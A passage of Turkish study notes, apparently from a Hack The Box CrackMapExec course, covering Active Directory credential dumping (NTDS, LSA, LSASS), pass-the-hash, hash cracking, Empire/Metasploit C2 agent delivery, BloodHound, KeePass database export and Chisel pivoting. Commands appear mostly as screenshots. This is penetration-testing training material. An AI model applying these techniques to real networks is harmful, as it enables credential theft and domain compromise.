+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
